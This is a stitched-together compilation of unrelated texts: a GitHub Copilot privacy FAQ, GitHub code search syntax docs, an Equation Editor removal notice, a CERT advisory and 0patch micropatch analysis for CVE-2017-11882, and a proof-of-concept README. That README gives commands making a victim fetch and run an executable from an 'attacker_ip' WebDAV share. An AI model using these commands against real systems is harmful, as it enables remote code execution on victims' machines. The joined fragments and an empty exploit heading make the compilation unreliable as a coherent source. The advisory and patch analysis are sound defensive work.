* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

# Understanding GitHub Code Search syntax

You can build search queries for the results you want with specialized code qualifiers, regular expressions, and boolean operations.

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

Equation Editor (Microsoft Equation 3.0) was included in earlier versions of Word, but was removed from all versions in the January 2018 Public Update (PU) and replaced with a new equation editor.

The content here describes this feature for users who have installed this update.

**Important:**Equation Editor 3.0 it was removed because of security issues with its implementation. Users who try to edit an equation created in Equation Editor 3.0 will receive the error message "Microsoft Equation is not available." Equation Editor 3.0 objects will still display normally if you have MT Extra font installed (if you don't have the font, you can [download it](https://www.microsoft.com/en-us/download/details.aspx?id=56828)). However, users can edit these equations only by downloading the MathType software tools that are provided by WIRIS. See [MathType desktop for Equation Editor users](https://www.wiris.com/equation_editor/microsoft).

## Microsoft Office Equation Editor stack buffer overflow

#### Vulnerability Note VU#421280

Original Release Date: 2017-11-15 | Last Revised: 2017-11-20

---

### Overview

Microsoft Equation Editor contains a stack buffer overflow, which can allow a remote, unauthenticated attacker to execute arbitrary code on a vulnerable system.

### Description

| Microsoft Equation Editor is a component that comes with Microsoft Office. It is an out-of-process [COM server](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683835%28v%3Dvs.85%29.aspx) that is hosted by eqnedt32.exe. The Microsoft Equation Editor contains a stack buffer overflow vulnerability.  Memory corruption vulnerabilities in modern software are often mitigated by [exploit protections](https://msdn.microsoft.com/en-us/library/bb430720.aspx?f=255&MSPPError=-2147217396), such as DEP and ASLR. More modern memory corruption protections include features like [CFG](https://msdn.microsoft.com/en-us/library/windows/desktop/mt637065%28v%3Dvs.85%29.aspx). Even in a modern, fully-patched Microsoft Office 2016 system, the Microsoft Equation Editor lacks any exploit protections, however. This lack of exploit protections allows an attacker to achieve code execution more easily than if protections were in place. For example, because eqnedt32.exe was linked without the /DYNAMICBASE flag, it will not be loaded at a randomized location by default.Because Equation Editor is an out-of-process COM server, this also means that protections specific to any Microsoft Office application may not have an effect on this vulnerability. For example, if the exploit document is an RTF document, the document will open in Microsoft Word. However, the COM server eqnedt32.exe is invoked by the Windows DCOM Server Process Launcher service, as opposed to Word itself. For this reason, [EMET](https://www.microsoft.com/en-us/download/details.aspx?id=54264) or [Windows Defender Exploit Guard](https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard) protections specific to the Microsoft Office programs themselves will not protect users. For this same reason, none of the Windows Defender Exploit Guard [Attack Surface Reduction (ASR)](https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction) protections will help either.Windows 7 users who have EMET configured for ASLR to be "always on" at a system-wide level are protected against known exploitation techniques for this vulnerability. Starting with Windows 8.0, system-wide ASLR receives entropy for non-DYNAMICBASE code only if bottom-up ASLR is enabled on a system-wide level as well. Neither EMET nor Windows Defender Exploit Guard configures system-wide bottom-up ASLR though. Because of this, Windows 8.0 through Windows 10 systems must enable specific protections for this vulnerability. |
| --- |

### Impact

| By convincing a user to open a specially-crafted Office document, a remote, unauthenticated attacker may be able to execute arbitrary code with the privileges of the logged-on user. |
| --- |

### Solution

| **Apply an update**This issue is addressed in [CVE-2017-11882 | Microsoft Office Memory Corruption Vulnerability](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882). |
| --- |

| **Disable Microsoft Equation Editor in Office**The vulnerable Equation Editor component can be disabled in Microsoft Office by importing the following registry values:Windows Registry Editor Version 5.00[HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}]"Compatibility Flags"=dword:00000400[HKEY\_LOCAL\_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}]"Compatibility Flags"=dword:00000400**Add EMET or Windows Defender Exploit Guard protections to** **eqnedt32.exe**Exploitation of the vulnerable Equation Editor can be prevented by [applying exploit mitigations](https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/) to the eqnedt32.exe executable. In particular, enabling ASLR for should be sufficient to block the code re-use attack that is outlined in the [Embedi documentation](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about).**Enable system-wide ASLR in Windows**Windows with properly-enabled system-wide ASLR (see [VU#817544](https://www.kb.cert.org/vuls/id/817544) for more details affecting Windows 8 and newer systems) will block known exploits for this vulnerability. |

# webdav\_exec CVE-2017-11882

A simple PoC for CVE-2017-11882.
This exploit triggers WebClient service to start and execute remote file from attacker-controlled WebDav server.
The reason why this approach might be handy is a limitation of executed command length.
However with help of WebDav it is possible to launch arbitrary attacker-controlled executable on vulnerable machine.
This script creates simple document with several OLE objects.
These objects exploits CVE-2017-11882, which results in sequential command execution.

The first command which triggers WebClient service start may look like this:

```
cmd.exe /c start \\attacker_ip\ff

```

Attacker controlled binary path should be a UNC network path:

```
\\attacker_ip\ff\1.exe

```

## Usage

```
webdav_exec_CVE-2017-11882.py -u trigger_unc_path -e executable_unc_path -o output_file_name
```

# Sample exploit for CVE-2017-11882 (starting calc.exe as payload)

### Microsoft's Manual Binary Patch For CVE-2017-11882 Meets 0patch

by Luka Treiber, the 0patch Team

Last Monday evening Embedi published the [PoC](https://github.com/embedi/CVE-2017-11882) referred to in their [report](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about) and on Tuesday we released a micropatch for the vulnerability. Here is the analysis.

The PoC is in form of an RTF file that, if opened in Microsoft Word, immediately pops up calc.exe. To accomplish this, Embedi overflowed a string buffer on the stack with an overlong font name applied to an equation text.

As shown in their [WinDbg screenshot](https://embedi.com/files/blog/word/word-11.png), the overlong font name contains a command string to be executed followed by padding A's until a trailing return address to a WinExec call at offset 2Ch that is supposed to execute the command string. Apparently the WinExec call address, located at font string offset that is already out of bounds of the designated buffer, replaces a legitimate return address on stack so when the vulnerable function returns, the payload gets executed instead.

What was Microsoft's official patch? As already said in [our previous post](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html), the [diff](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG) of EqnEdt32.exe between versions 2017.8.14.0 and 2000.11.9.0 showed only 5 modified functions. Running the PoC with WinDbg attached showed that it executes one of the patched functions, sub\_0041160F. There were 5 changed blocks of code in that function, but it turns out the relevant patch that blocks the PoC is the topmost one.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1aVO1dhaPCOOKmGek0vrmyzNX4seQPRFFjLrvnMxXYLZsaTSYLVIqxY6QnG_u0eVBDDfnQ2BlBrIC5qTdKs0Mu4Clmf2y_PK4TH2f-uQM0SdKVJ3s_htjhamv5vss6snN3LliS9mnYfaZ/s640/diff1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1aVO1dhaPCOOKmGek0vrmyzNX4seQPRFFjLrvnMxXYLZsaTSYLVIqxY6QnG_u0eVBDDfnQ2BlBrIC5qTdKs0Mu4Clmf2y_PK4TH2f-uQM0SdKVJ3s_htjhamv5vss6snN3LliS9mnYfaZ/s1600/diff1.png)

This patch consists of an added boundary check (top square on the left) and buffer truncation code (bottom square on the left)  to a vulnerable memcpy operation that overwrote a stack buffer as previously mentioned. The conditional is placed after counting bytes to be copied from arg\_0 to var\_28 and makes sure that if the source string is too long, only 0x20 bytes are copied and zero-terminated.

However, this is not the biggest difference applied to the vulnerable code block. The most code reorganization and, we believe, effort had to be put into the middle square where the developer replaced the compiler's memcpy implementation on the right with a more compressed alternative to gain space for injecting the aforementioned security check.

Based on all these findings we wrote our own micropatch:

; CVE-2017-11882 patch for Equation Editor EQNEDT32.EXE 2000.11.9.0
MODULE\_PATH "C:\Analysis\CVE-2017-11882\EQNEDT32.EXE"
PATCH\_ID 313
PATCH\_FORMAT\_VER 2
VULN\_ID 3084
PLATFORM win32

patchlet\_start
 PATCHLET\_ID 1
 PATCHLET\_TYPE 2
 PATCHLET\_OFFSET 0x0001164C

 code\_start

  cmp     ecx, 21h
  jb      skip
  mov     ecx, 20h
  call PIT\_ExploitBlocked
  skip:

patchlet\_end

patchlet\_start
 PATCHLET\_ID 2
 PATCHLET\_TYPE 2
 PATCHLET\_OFFSET 0x00011661

 code\_start

  xor eax, eax
  stosb ; zero-terminate the string

 code\_end

patchlet\_end

With this micropatch we did the same thing as Microsoft, only we had no hassle finding the space to inject our code. It is quite ingenious how they managed to compress the code around the patch offset in order to make room for the patch code that required additional 10 bytes. We too need space at the patch offset in order to inject a jmp to our micropatch, however, our technology takes care of automatically injecting these 5 bytes and relocating the original code somewhere else. There are certain requirements that the patch location has to meet (see our [0patch Developer Manual](https://0patch.com/dev_manual.htm) for details), but this is far less constraining than compacting code around the offset like Microsoft had to do.

Our micropatches for this vulnerability have been labeled ZP-313 and ZP-314 (there are two slightly different versions of EqnEdt32.exe) and cover all Microsoft Office versions from 2007 to 2016 and 365. As always, if you have 0patch Agent installed, these micropatches should already be present and applied on your system. If not, you can [download a free copy of 0patch Agent](http://0patch.com/download.htm) to protect your system from CVE-2017-11882.

(By the way, ZP-313 and ZP-314 have replaced the now-revoked micropatch for this issue we had released on Tuesday because we wanted to add the zero-termination code and thus fully mirror the official patch. In case you didn't know how micropatch revocation works, it's just as seamless as everything else: the revoked patch simply stops being applied, and the new one starts getting applied instead. Again, users don't notice anything.)

It was a surprising and an interesting revelation that official software vendors/maintainers also occasionally resort to manual binary patching. Moreover, our analysis of the official patch has shown that in such cases it is harder to directly patch the binary than to use in-memory micropatching. Lastly it may even turn out to be infeasible to patch some bugs in binary files because the code may already be fully optimized for space and the technique seen in Microsoft's CVE-2017-11882 patch would require and unacceptable amount of effort. In cases like that micropatching can turn out to be more agile than traditional patching.

This being said, all that remains is the pleasure of presenting a video of our agile micropatch in action :)

### [42 Days After Our Micropatch, The Office DDE Vulnerability Gets An Official Fix](https://blog.0patch.com/2017/12/42-days-after-our-micropatch-office-dde.html)

**Yes, It's Okay Now To Call This "A Vulnerability"**

by Mitja Kolsek, the 0patch Team

**Introduction**

In October, a Dynamic Data Exchange-borne attack vector in Office was [published by Sensepost](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/) and got quickly adopted by attackers. While Microsoft's official stance at the time was that DDE was behaving as intended and the issue was "considered for a next-version candidate bug," we at 0patch [decided to create a micropatch](https://blog.0patch.com/2017/10/0patching-office-dde-ddeauto.html) that would prevent all supported versions of Word - and by extension, Outlook - from launching external applications via DDE field updates.

